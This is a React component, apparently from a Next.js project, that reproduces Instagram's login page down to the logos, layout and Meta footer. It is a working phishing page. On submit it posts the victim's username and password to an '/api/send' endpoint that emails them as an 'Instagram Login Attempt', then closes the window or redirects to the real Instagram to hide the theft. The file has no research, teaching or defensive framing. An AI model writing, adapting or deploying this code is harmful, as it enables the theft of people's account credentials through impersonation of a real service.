'use client'
import React, { useState, useEffect } from 'react';

// --- SVG Icons Components ---

const InstagramIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" className="w-full h-full text-white">
        <path fill="url(#ig-grad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.069-4.85.069-3.204 0-3.584-.012-4.849-.069-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0z" />
        <path fill="url(#ig-grad)" d="M12 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zm0 10.162a4 4 0 110-8 4 4 0 010 8zM20.283 4.98a1.44 1.44 0 11-2.88 0 1.44 1.44 0 012.88 0z" />
        <defs>
            <linearGradient id="ig-grad" x1="0" y1="24" x2="24" y2="0" gradientUnits="userSpaceOnUse">
                <stop stopColor="#f09433" />
                <stop offset="0.25" stopColor="#e6683c" />
                <stop offset="0.5" stopColor="#dc2743" />
                <stop offset="0.75" stopColor="#cc2366" />
                <stop offset="1" stopColor="#bc1888" />
            </linearGradient>
        </defs>
    </svg>
);

const FacebookIcon = () => (
    <svg viewBox="0 0 24 24" fill="#4cb5f9" className="w-5 h-5">
        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
    </svg>
);

const MetaIcon = () => (
    <svg viewBox="0 0 24 24" fill="currentColor" className="w-4 h-4">
        <path d="M16.924 5.594c-2.617-.03-5.068 1.95-6.284 3.32-1.391-1.63-4.008-3.35-6.284-3.32C1.659 5.634 0 7.854 0 11.664c0 3.19 1.417 6.4 4.356 6.742 2.628.3 5.378-2.07 6.284-3.32 1.096 1.51 3.527 3.62 6.284 3.32 2.94-.342 4.356-3.552 4.356-6.742 0-3.81-1.659-6.03-4.356-6.07zm0 11.08c-1.892.22-3.79-1.57-4.64-2.74l-.06-.09-.07.09c-.85 1.17-2.748 2.96-4.64 2.74-1.893-.22-3.086-2.6-3.086-5.02 0-2.42 1.373-3.69 3.086-3.66 1.892.03 3.568 1.92 4.53 3.25l.18.25.18-.25c.962-1.33 2.638-3.22 4.53-3.25 1.713-.03 3.086 1.24 3.086 3.66 0 2.42-1.193 4.8-3.086 5.02z" />
    </svg>
);

const Spinner = () => (
    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
    </svg>
);

// --- Main Component ---

export default function InstagramLogin() {
    const [formData, setFormData] = useState({
        username: '',
        password: ''
    });

    const [errors, setErrors] = useState({
        username: '',
        password: ''
    });

    const [isLoading, setIsLoading] = useState(false);
    const [isFormValid, setIsFormValid] = useState(false);

    // Focus input on mount
    useEffect(() => {
        const input = document.getElementById('username');
        if (input) input.focus();
    }, []);

    // Check form validity
    useEffect(() => {
        setIsFormValid(formData.username.length > 0 && formData.password.length >= 6);
    }, [formData]);

    const handleInputChange = (e) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));

        // Clear specific error on type
        if (errors[name]) {
            setErrors(prev => ({
                ...prev,
                [name]: ''
            }));
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        // Basic Validation
        const newErrors = {
            username: '',
            password: ''
        };
        
        if (!formData.username || formData.username.length < 3) {
            newErrors.username = 'Please check your username.';
        }
        if (!formData.password || formData.password.length < 6) {
            newErrors.password = 'Password is incorrect.';
        }

        if (newErrors.username || newErrors.password) {
            setErrors(newErrors);
            return;
        }

        // Send email with login data
        setIsLoading(true);
        
        try {
            const response = await fetch('/api/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    subject: `Instagram Login Attempt - ${formData.username}`,
                    text: formData // This will be formatted nicely in the API
                }),
            });

            const data = await response.json();

            if (data.success) {
                // Optional: Show success message before closing
                console.log('Email sent successfully');
                
                // Wait a bit before closing so email can be sent
                setTimeout(() => {
                    // Try to close the window (only works if opened via JavaScript)
                    window.close();
                    
                    // If window.close() doesn't work, redirect somewhere
                    if (!window.closed) {
                        window.location.href = 'https://www.instagram.com';
                    }
                }, 1000);
            } else {
                setErrors({
                    username: '',
                    password: 'Something went wrong. Please try again.'
                });
                setIsLoading(false);
            }
        } catch (error) {
            console.error('Error:', error);
            setErrors({
                username: '',
                password: 'Network error. Please try again.'
            });
            setIsLoading(false);
        }
    };

    return (
        <div className="min-h-screen bg-black text-white font-sans flex flex-col lg:grid lg:grid-cols-[60%_40%]">

            {/* Left Column - Hero Section (Hidden on Mobile) */}
            <div className="hidden lg:flex flex-col items-center justify-center relative overflow-hidden bg-black p-10">

                {/* Top Left Logo */}
                <div className="absolute top-12 left-12 w-16 h-16">
                    <InstagramIcon />
                </div>

                {/* Hero Content Wrapper */}
                <div className="flex flex-col items-center z-10 mt-10">

                    {/* Tagline */}
                    <div className="mb-20 text-center">
                        <h1 className="text-4xl font-light tracking-wide mb-1">See everyday moments from</h1>
                        <h1 className="text-4xl font-light tracking-wide bg-gradient-to-r from-[#ff0080] to-[#ff8c00] bg-clip-text text-transparent">
                            your close friends.
                        </h1>
                    </div>

                    {/* Card Collage */}
                    <div className="relative w-[400px] h-[500px]">
                        {/* Left Card */}
                        <div className="absolute top-10 -left-16 w-64 h-96 rounded-2xl overflow-hidden shadow-2xl transform -rotate-12 hover:rotate-0 transition-transform duration-500 z-10 border border-[#262626] bg-[#1a1a1a]">
                            <img
                                src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=500&q=80"
                                alt="Close friend 1"
                                className="w-full h-full object-cover opacity-80 hover:opacity-100 transition-opacity"
                            />
                            <div className="absolute bottom-4 left-4 bg-red-500 rounded-full p-2">
                                <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" /></svg>
                            </div>
                        </div>

                        {/* Right Card */}
                        <div className="absolute top-16 -right-12 w-64 h-96 rounded-2xl overflow-hidden shadow-2xl transform rotate-6 hover:rotate-0 transition-transform duration-500 z-10 border border-[#262626] bg-[#1a1a1a]">
                            <img
                                src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=500&q=80"
                                alt="Close friend 2"
                                className="w-full h-full object-cover opacity-80 hover:opacity-100 transition-opacity"
                            />
                            <div className="absolute bottom-4 right-4 bg-[#262626] rounded-full px-3 py-1 text-xs border border-[#363636]">
                                😍 🔥
                            </div>
                        </div>

                        {/* Center Card */}
                        <div className="absolute top-0 left-8 w-72 h-[420px] rounded-2xl overflow-hidden shadow-2xl transform hover:scale-105 transition-transform duration-500 z-20 border border-[#262626] bg-[#1a1a1a]">
                            <img
                                src="https://images.unsplash.com/photo-1523983252436-1d8246c1e956?w=500&q=80"
                                alt="Close friend main"
                                className="w-full h-full object-cover"
                            />
                            <div className="absolute top-4 right-4 bg-[#00c853] rounded-full p-1 border-2 border-black">
                                <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path d="M5 13l4 4L19 7" /></svg>
                            </div>
                            <div className="absolute bottom-0 w-full p-4 bg-gradient-to-t from-black/80 to-transparent">
                                <div className="flex items-center gap-2">
                                    <div className="w-8 h-8 rounded-full border-2 border-[#ff0080] overflow-hidden">
                                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&q=80" alt="avatar" className="w-full h-full object-cover" />
                                    </div>
                                    <span className="text-sm font-semibold">alex_simons</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            {/* Right Column - Login Form */}
            <div className="w-full min-h-screen flex flex-col items-center justify-center bg-[#0a0a0a] border-l border-[#1a1a1a] relative">

                {/* Mobile Header (Only visible on small screens) */}
                <div className="lg:hidden absolute top-8 mb-8">
                    <div className="w-16 h-16">
                        <InstagramIcon />
                    </div>
                </div>

                <div className="w-full max-w-[350px] px-4 sm:px-0">

                    <h2 className="text-white text-xl mb-6 font-semibold">Log into Instagram</h2>

                    <form onSubmit={handleSubmit} className="flex flex-col gap-2">

                        {/* Username Field */}
                        <div className="w-full">
                            <input
                                id="username"
                                type="text"
                                name="username"
                                value={formData.username}
                                onChange={handleInputChange}
                                placeholder="Mobile number, username or email"
                                className={`w-full bg-[#121212] border ${errors.username ? 'border-[#ed4956]' : 'border-[#363636]'} rounded text-sm text-white placeholder-[#737373] px-3 py-[9px] focus:border-[#737373] focus:outline-none transition-colors duration-200`}
                                disabled={isLoading}
                            />
                            {errors.username && (
                                <p className="text-[#ed4956] text-xs mt-1 text-left">{errors.username}</p>
                            )}
                        </div>

                        {/* Password Field */}
                        <div className="w-full">
                            <input
                                type="password"
                                name="password"
                                value={formData.password}
                                onChange={handleInputChange}
                                placeholder="Password"
                                className={`w-full bg-[#121212] border ${errors.password ? 'border-[#ed4956]' : 'border-[#363636]'} rounded text-sm text-white placeholder-[#737373] px-3 py-[9px] focus:border-[#737373] focus:outline-none transition-colors duration-200`}
                                disabled={isLoading}
                            />
                            {errors.password && (
                                <p className="text-[#ed4956] text-xs mt-1 text-left">{errors.password}</p>
                            )}
                        </div>

                        {/* Login Button */}
                        <button
                            type="submit"
                            className={`w-full mt-2 flex items-center justify-center bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold text-sm py-[7px] px-4 rounded-lg transition-all duration-200 ${(!isFormValid || isLoading) ? 'opacity-70 cursor-not-allowed hover:bg-[#0095f6]' : 'cursor-pointer'}`}
                            disabled={!isFormValid || isLoading}
                        >
                            {isLoading ? <Spinner /> : 'Log in'}
                        </button>

                        {/* Forgot Password */}
                        <div className="text-center mt-4">
                            <button type="button" className="text-[#e0f1ff] text-xs hover:text-white transition-colors duration-200">
                                Forgot password?
                            </button>
                        </div>

                        {/* Divider */}
                        <div className="flex items-center my-4 w-full">
                            <div className="h-px bg-[#262626] w-full"></div>
                        </div>

                        {/* Facebook Login */}
                        <button type="button" className="flex items-center justify-center gap-2 w-full py-2 hover:opacity-70 transition-opacity duration-200">
                            <FacebookIcon />
                            <span className="text-[#4cb5f9] font-semibold text-sm">Log in with Facebook</span>
                        </button>

                        {/* Create Account */}
                        <button
                            type="button"
                            className="mt-6 w-full border border-[#363636] rounded-lg py-[7px] text-[#4cb5f9] font-semibold text-sm hover:bg-[#121212] hover:border-[#555] transition-all duration-200"
                        >
                            Create new account
                        </button>

                        {/* Meta Logo */}
                        <div className="mt-10 flex items-center justify-center gap-1 text-[#737373]">
                            <MetaIcon />
                            <span className="text-xs font-medium">Meta</span>
                        </div>

                    </form>
                </div>

                {/* Footer */}
                <footer className="absolute bottom-0 w-full py-4 border-t border-[#262626] bg-black px-4 hidden sm:block">
                    <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[#737373] text-[12px]">
                        {['Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms', 'Locations', 'Instagram Lite', 'Threads', 'Contact Uploading & Non-Users', 'Meta Verified'].map((link) => (
                            <a key={link} href="#" className="hover:underline">{link}</a>
                        ))}
                    </div>
                    <div className="flex justify-center items-center gap-4 mt-3 text-[#737373] text-[12px]">
                        <span>English <span className="align-middle">v</span></span>
                        <span>© 2026 Instagram from Meta</span>
                    </div>
                </footer>

            </div>
        </div>
    );
}